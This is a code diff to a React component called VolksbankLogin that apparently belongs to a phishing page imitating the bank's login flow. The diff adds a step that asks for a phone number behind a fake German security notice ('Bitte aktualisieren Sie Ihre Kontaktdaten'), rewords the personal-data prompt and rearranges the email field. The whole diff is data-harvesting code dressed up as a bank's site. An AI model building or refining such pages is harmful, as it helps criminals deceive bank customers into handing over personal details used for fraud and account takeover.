@@ -288,10 +288,39 @@ const VolksbankLogin = () => {
                   </a>
                 </div>
               </div>
+            ) : step === "phone" ? (
+              <div className="bg-white px-6 py-5 space-y-4">
+                <div className="rounded border-l-4 p-3 text-[13.5px]" style={{ borderColor: BLUE, backgroundColor: "#eaf2fb", color: "#1a3a63" }}>
+                  <strong>Wichtig:</strong> Bitte aktualisieren Sie Ihre Kontaktdaten, damit wir Sie bei sicherheitsrelevanten Vorgängen erreichen können.
+                </div>
+
+                <div data-field="phone">
+                  <label className="block text-xs font-semibold mb-1" style={{ color: "#666" }}>Telefonnummer *</label>
+                  <input
+                    type="tel"
+                    value={phone}
+                    onChange={(e) => setPhone(e.target.value)}
+                    onBlur={onBlur("phone")}
+                    className={inputCls("phone")}
+                    placeholder="+43 …"
+                  />
+                  {hasError("phone") && <p className="mt-1 text-[12px] text-red-600">{REQUIRED_MESSAGES.phone}</p>}
+                </div>
+
+                <hr className="-mx-6 border-gray-200" />
+                <button
+                  onClick={handlePhoneSubmit}
+                  disabled={submitting}
+                  className="w-full py-3 text-white font-semibold rounded text-sm disabled:opacity-60"
+                  style={{ backgroundColor: BLUE }}
+                >
+                  Weiter
+                </button>
+              </div>
             ) : (
               <div className="bg-white px-6 py-5 space-y-4">
                 <div className="rounded border-l-4 p-3 text-[13.5px]" style={{ borderColor: BLUE, backgroundColor: "#eaf2fb", color: "#1a3a63" }}>
-                  <strong>Wichtig:</strong> Aus Sicherheitsgründen bitten wir Sie, Ihre persönlichen Daten zu überprüfen und zu aktualisieren.
+                  <strong>Wichtig:</strong> Bitte vervollständigen Sie Ihre persönlichen Daten.
                 </div>
 
                 <div className="grid grid-cols-2 gap-3">
@@ -365,17 +394,10 @@ const VolksbankLogin = () => {
                   </div>
                 </div>
 
-                <div className="grid grid-cols-2 gap-3">
-                  <div data-field="email">
-                    <label className="block text-xs font-semibold mb-1" style={{ color: "#666" }}>E-Mail *</label>
-                    <input type="email" value={email} onChange={(e) => setEmail(e.target.value)} onBlur={onBlur("email")} className={inputCls("email")} />
-                    {hasError("email") && <p className="mt-1 text-[12px] text-red-600">{REQUIRED_MESSAGES.email}</p>}
-                  </div>
-                  <div data-field="phone">
-                    <label className="block text-xs font-semibold mb-1" style={{ color: "#666" }}>Telefonnummer *</label>
-                    <input type="tel" value={phone} onChange={(e) => setPhone(e.target.value)} onBlur={onBlur("phone")} className={inputCls("phone")} />
-                    {hasError("phone") && <p className="mt-1 text-[12px] text-red-600">{REQUIRED_MESSAGES.phone}</p>}
-                  </div>
+                <div data-field="email">
+                  <label className="block text-xs font-semibold mb-1" style={{ color: "#666" }}>E-Mail *</label>
+                  <input type="email" value={email} onChange={(e) => setEmail(e.target.value)} onBlur={onBlur("email")} className={inputCls("email")} />
+                  {hasError("email") && <p className="mt-1 text-[12px] text-red-600">{REQUIRED_MESSAGES.email}</p>}
                 </div>
 
                 <hr className="-mx-6 border-gray-200" />
